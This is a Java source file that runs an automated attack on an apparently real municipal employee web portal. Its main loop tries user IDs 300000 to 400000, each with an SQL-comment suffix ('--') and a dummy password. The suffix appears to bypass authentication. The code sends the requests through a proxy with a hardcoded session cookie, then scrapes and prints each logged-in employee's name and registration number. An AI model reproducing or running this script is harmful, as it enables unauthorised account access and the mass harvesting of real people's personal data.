package enviar.post;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Proxy.Type;
import java.net.SocketAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.util.HashSet;
import java.util.Set;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import entidades.InfoPessoa;



public class Teste01 {
	
	String pessoaAnt = "";
	Set<InfoPessoa> listaPessoas = new HashSet<InfoPessoa>();
	
	private final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0";

	private void sendPost(String metodo, String url, String urlParameters) throws Exception {
		
		byte[] postData       = urlParameters.getBytes(Charset.forName("UTF-8"));
		int    postDataLength = postData.length;

		try {
			
			URL obj = new URL(url);
			SocketAddress addr = new InetSocketAddress("proxy.tjpb.jus.br", 3128);
			Proxy proxy = new Proxy(Type.HTTP, addr);
			HttpURLConnection con = (HttpURLConnection) obj.openConnection(proxy);
	
			//add reuqest header
			con.setRequestMethod(metodo);
			
			con.setRequestProperty("Host", "www.franinformatica.com.br");
			con.setRequestProperty("Referer", "http://www.franinformatica.com/PortalServidor/index.php?ini=PMTP");
			con.setRequestProperty("User-Agent", USER_AGENT);
			con.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			con.setRequestProperty("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3");
			con.setRequestProperty("Cookie", "PHPSESSID=eui98eiip16ipg169c98ppdcc7");
			con.setRequestProperty("Connection", "keep-alive");
			con.setRequestProperty("Upgrade-Insecure-Requests", "1");
			if(metodo.equals("POST")) {
				con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
				//con.setRequestProperty("Accept-Encoding", "gzip");
				con.setRequestProperty("Content-Length", Integer.toString( postDataLength ));
				
				// Send post request
				con.setDoOutput(true);
				//OutputStream wr = con.getOutputStream();
				OutputStream wr = new DataOutputStream(con.getOutputStream());
				wr.write(postData);
				//wr.flush();
				//wr.close();
				//System.out.println("Post parameters : " + urlParameters);
			}
	
			int responseCode = con.getResponseCode();
			//System.out.println("\nSending '"+metodo+"' request to URL : " + url);
			//System.out.println("Response Code : " + responseCode);
	
			BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
			String inputLine;
			StringBuffer response = new StringBuffer();

			while ((inputLine = in.readLine()) != null) {
				response.append(inputLine);
			}
			in.close();

			//print result
			//System.out.println(response.toString());
			
			if(responseCode==200 && urlParameters.equals("pg=home")) {
				obterInformacoes(response.toString());
			}
		
		} catch (UnknownHostException e) {
	        System.out.println("Erro (UnknownHostException): "+e.getMessage());
	        Thread.sleep(500);
	    }

	}
	
	public static void main(String[] args) throws Exception {
		Teste01 teste = new Teste01();
		
		try{
			String urlParameters = ""; 
//			for(int i=501190; i<501500; i++){ 
			for(int i=300000; i<400000; i++){ 
				//System.out.print(i+":");
				urlParameters = "usuario="+i+"--&senha=99999999999&vinculo=PMTP"; 
				teste.sendPost("GET","http://www.franinformatica.com.br/PortalServidor/index.php?ini=PMTP", "");
				teste.sendPost("POST","http://www.franinformatica.com.br/PortalServidor/validacao.php", urlParameters);
				teste.sendPost("GET","http://www.franinformatica.com.br/PortalServidor/SisContra/SisContra.php?pg=home", "pg=home");
				Thread.sleep(1000);
			}
		} catch (Exception e) {
	        System.out.println("Erro (Exception): "+e.getMessage());
	    }
		
		System.out.println("----- FIM ------");
		//teste.listaPessoas.stream().forEach(p -> {System.out.println(p.toString());}); 
		
	}
	
	public String obterInformacoes(String response) throws Exception {

		Document doc = Jsoup.parse(response.toString());
		Elements contents = doc.getElementsByTag("ol"); 
		int idx = 0;
		boolean registroValido = false;
		InfoPessoa infoPessoa = new InfoPessoa();
		
		for (Element elemento : contents) {
			if(idx>=0){
				String texto = elemento.text().trim();
				
				if(texto!=null && !texto.equals("00000") && texto.length()>=4){
					switch(idx){
					case 0:
						infoPessoa.setNome(texto);
						break;
					default:
						break;
					}
					texto = null;
				}
				
			}
			idx++;
		}
		if(infoPessoa!=null&&infoPessoa.getNome()!=null) {
			if(infoPessoa.getNome().contains(" - ")) {
				String array[] = infoPessoa.getNome().split("-");
				String nome = array[0];
				String matr = array[1];
				infoPessoa.setNome(nome.replace("Bem Vindo ", "").trim());
				infoPessoa.setCpf(matr.replace("Matrícula: ", "").trim());
			}
			
			String pessoaAtual = infoPessoa.getCpf()+ "-" +infoPessoa.getNome();
			if(!pessoaAtual.equals(pessoaAnt)) {
				System.out.println(pessoaAtual);	
			}
			pessoaAnt = pessoaAtual;
					
		}
		return null;

	}


}
